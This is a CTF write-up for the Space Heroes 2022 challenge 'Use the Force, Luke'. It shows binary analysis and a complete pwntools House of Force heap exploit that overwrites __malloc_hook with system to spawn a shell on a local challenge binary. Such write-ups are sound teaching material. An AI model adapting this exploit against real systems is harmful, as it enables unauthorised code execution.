---
title: "Pwn: Use the Force, Luke"
date: 2025-01-15
draft: false
summary: Space Heroes CTF 2022. House of Force heap exploitation.
tags:
  - heap
  - house-of-force
category: Pwn
---
###### Challenge
We are provided a zip file which contains the binary *force* and its GLIBC. The binary seems to be using `GLIBC 2.28 No TCache`. Let's analyze the binary to get more information.

`force: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./.glibc/glibc_2.28_no-tcache/ld.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c50b5c7f0a7dc45dd3409c7fbf1350c534c52662, not stripped`

```
┌──(chronopad㉿VincentXPS)-[~/Documents/ctf2025/SpaceHeroesCTF_2022/usetheforceluke]
└─$ checksec force
[*] '/home/chronopad/Documents/ctf2025/SpaceHeroesCTF_2022/usetheforceluke/force'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./.glibc/glibc_2.28_no-tcache'
    Stripped:   No
```

We are given a custom GLIBC file, which means that there's a specific exploit that we can only perform in this specific GLIBC version, usually a part of heap exploitation techniques.

###### Solution
If we run the binary, we are given two addresses leak. One address is system and the other seems to be the address of the heap. We are then given two choices, which is to "Reach out with the force" or to "Surrender". Surrendering will exit the program while the first option will trigger some questions. To understand what they do, we can try disassembling the binary. Here is a part of `main()` disassembled with **radare2**.

```
│     │╎│   0x004009a2      488d3dbc0100.  lea rdi, str.How_many_midi_chlorians_:_ ; 0x400b65 ; "How many midi-chlorians?: "
│     │╎│   0x004009a9      b800000000     mov eax, 0
│     │╎│   0x004009ae      e8bdfdffff     call sym.imp.printf         ; int printf(const char *format)
│     │╎│   0x004009b3      488d45e0       lea rax, [var_20h]
│     │╎│   0x004009b7      4889c6         mov rsi, rax
│     │╎│   0x004009ba      488d3dbf0100.  lea rdi, str._llu           ; 0x400b80 ; "%llu"
│     │╎│   0x004009c1      b800000000     mov eax, 0
│     │╎│   0x004009c6      e8e5fdffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│     │╎│   0x004009cb      488d3db30100.  lea rdi, str.What_do_you_feel_:_ ; 0x400b85 ; "What do you feel?: "
│     │╎│   0x004009d2      b800000000     mov eax, 0
│     │╎│   0x004009d7      e894fdffff     call sym.imp.printf         ; int printf(const char *format)
│     │╎│   0x004009dc      488b45e0       mov rax, qword [var_20h]
│     │╎│   0x004009e0      4889c7         mov rdi, rax
│     │╎│   0x004009e3      e8b8fdffff     call sym.imp.malloc         ;  void *malloc(size_t size)
```

We can see that the program calls `malloc()`, using the amount of midi-chlorians as the chunk size. Anything we input to the "What do you feel?" question will then be written to the heap memory chunk.

Based on the challenge name, we can pretty much guess that this challenge is a House of Force heap exploitation challenge. This exploitation techniques works by writing more data to the heap more than the chunk size that we requested, which overwrites the size field of the top chunk of the heap, allowing us to do arbitrary write and even code execution.

![Image Description](/images/Pasted%20image%2020250115205717.png)

Because this is just a standard / base-case of the House of Force technique, I'll cut the explanation and go straight for the exploitation. If you are interested about the exploitation, feel free to read the resource below:
- https://mohamed-fakroud.gitbook.io/red-teamings-dojo/binary-exploitation/heap-house-of-force

```
# exploit.py
from pwn import *

elf = context.binary = ELF("./force")
libc = ELF("./.glibc/glibc_2.28_no-tcache/libc-2.28.so")
io = process(elf.path)
context.log_level = 'debug'

def malloc(size, data):
	io.sendlineafter(b"(2) Surrender\n", b"1")
	io.sendlineafter(b"How many midi-chlorians?: ", str(size).encode())
	io.sendlineafter(b"What do you feel?: ", data)

io.recvuntil(b"You feel a system at ")
libc.address = int(io.recvline().decode(), 16) - libc.sym["system"]
io.recvuntil(b"You feel something else at ")
heap_addr = int(io.recvline().decode(), 16)

print(f"Libc address: {hex(libc.address)}")

malloc(24, b"/bin/sh\x00" + b"A"*16 + p64(0xffffffffffffffff))
malloc((libc.sym["__malloc_hook"] - 0x20) - (heap_addr + 0x20), b"A")
malloc(24, p64(libc.sym["system"]))
# malloc(str(heap_addr + 0x10).encode(), b"A")
malloc(next(libc.search(b"/bin/sh")), b"") # Honestly more reliable

io.interactive()
```

Link, resources:
- https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/space_heroes_22/Use%20the%20Force%2C%20Luke
- https://mohamed-fakroud.gitbook.io/red-teamings-dojo/binary-exploitation/heap-house-of-force
